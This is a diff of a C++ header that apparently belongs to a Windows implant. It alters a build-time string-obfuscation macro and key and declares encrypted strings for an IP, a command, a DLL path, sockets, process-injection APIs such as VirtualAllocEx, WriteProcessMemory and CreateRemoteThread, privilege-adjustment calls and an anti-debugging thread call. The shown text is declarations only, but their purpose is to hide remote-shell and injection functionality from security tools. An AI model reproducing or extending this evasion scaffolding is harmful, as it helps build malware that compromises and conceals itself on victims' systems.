@@ -2,102 +2,43 @@
 
 #include <array>
 
-#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i + 9) - 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 71)
-static std::array<uint8_t, 16> BUILD_TIME_KEY = { 169, 147, 8, 46, 105, 76, 56, 242, 97, 222, 251, 25, 121, 57, 9, 57 };
+#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i + 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i * BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 213)
+static std::array<uint8_t, 16> BUILD_TIME_KEY = { 134, 146, 107, 230, 30, 211, 123, 136, 214, 142, 146, 76, 167, 117, 161, 174 };
 
-extern unsigned char str_ip[];
-extern size_t str_ip_len;
+typedef struct EncryptedString {
+    unsigned char* data;
+    size_t length;
+} EncryptedString;
 
-extern unsigned char str_cmd[];
-extern size_t str_cmd_len;
-
-extern unsigned char str_dllPath[];
-extern size_t str_dllPath_len;
-
-extern unsigned char str_socket[];
-extern size_t str_socket_len;
-
-extern unsigned char str_NtSetInformationThread[];
-extern size_t str_NtSetInformationThread_len;
-
-extern unsigned char str_GetCurrentThread[];
-extern size_t str_GetCurrentThread_len;
-
-extern unsigned char str_Sleep[];
-extern size_t str_Sleep_len;
-
-extern unsigned char str_OpenProcess[];
-extern size_t str_OpenProcess_len;
-
-extern unsigned char str_VirtualAllocEx[];
-extern size_t str_VirtualAllocEx_len;
-
-extern unsigned char str_WriteProcessMemory[];
-extern size_t str_WriteProcessMemory_len;
-
-extern unsigned char str_LoadLibraryA[];
-extern size_t str_LoadLibraryA_len;
-
-extern unsigned char str_CreateRemoteThread[];
-extern size_t str_CreateRemoteThread_len;
-
-extern unsigned char str_CloseHandle[];
-extern size_t str_CloseHandle_len;
-
-extern unsigned char str_LookupPrivilegeValueA[];
-extern size_t str_LookupPrivilegeValueA_len;
-
-extern unsigned char str_GetLastError[];
-extern size_t str_GetLastError_len;
-
-extern unsigned char str_AdjustTokenPrivileges[];
-extern size_t str_AdjustTokenPrivileges_len;
-
-extern unsigned char str_OpenProcessToken[];
-extern size_t str_OpenProcessToken_len;
-
-extern unsigned char str_GetCurrentProcess[];
-extern size_t str_GetCurrentProcess_len;
-
-extern unsigned char str_CreateToolhelp32Snapshot[];
-extern size_t str_CreateToolhelp32Snapshot_len;
-
-extern unsigned char str_Process32First[];
-extern size_t str_Process32First_len;
-
-extern unsigned char str_Process32Next[];
-extern size_t str_Process32Next_len;
-
-extern unsigned char str_CreatePipe[];
-extern size_t str_CreatePipe_len;
-
-extern unsigned char str_SetHandleInformation[];
-extern size_t str_SetHandleInformation_len;
-
-extern unsigned char str_ReadFile[];
-extern size_t str_ReadFile_len;
-
-extern unsigned char str_FormatMessageA[];
-extern size_t str_FormatMessageA_len;
-
-extern unsigned char str_LocalFree[];
-extern size_t str_LocalFree_len;
-
-extern unsigned char str_CreateProcessA[];
-extern size_t str_CreateProcessA_len;
-
-extern unsigned char str_kernel32[];
-extern size_t str_kernel32_len;
-
-extern unsigned char str_ntdll[];
-extern size_t str_ntdll_len;
-
-extern unsigned char str_advapi32[];
-extern size_t str_advapi32_len;
-
-extern unsigned char str_ws2_32[];
-extern size_t str_ws2_32_len;
-
-extern unsigned char str_user32[];
-extern size_t str_user32_len;
-
+extern EncryptedString str_ip;
+extern EncryptedString str_cmd;
+extern EncryptedString str_dllPath;
+extern EncryptedString str_socket;
+extern EncryptedString str_NtSetInformationThread;
+extern EncryptedString str_GetCurrentThread;
+extern EncryptedString str_Sleep;
+extern EncryptedString str_OpenProcess;
+extern EncryptedString str_VirtualAllocEx;
+extern EncryptedString str_WriteProcessMemory;
+extern EncryptedString str_LoadLibraryA;
+extern EncryptedString str_CreateRemoteThread;
+extern EncryptedString str_CloseHandle;
+extern EncryptedString str_LookupPrivilegeValueA;
+extern EncryptedString str_GetLastError;
+extern EncryptedString str_AdjustTokenPrivileges;
+extern EncryptedString str_OpenProcessToken;
+extern EncryptedString str_GetCurrentProcess;
+extern EncryptedString str_CreateToolhelp32Snapshot;
+extern EncryptedString str_Process32First;
+extern EncryptedString str_Process32Next;
+extern EncryptedString str_CreatePipe;
+extern EncryptedString str_SetHandleInformation;
+extern EncryptedString str_ReadFile;
+extern EncryptedString str_FormatMessageA;
+extern EncryptedString str_LocalFree;
+extern EncryptedString str_CreateProcessA;
+extern EncryptedString str_kernel32;
+extern EncryptedString str_ntdll;
+extern EncryptedString str_advapi32;
+extern EncryptedString str_ws2_32;
+extern EncryptedString str_user32;
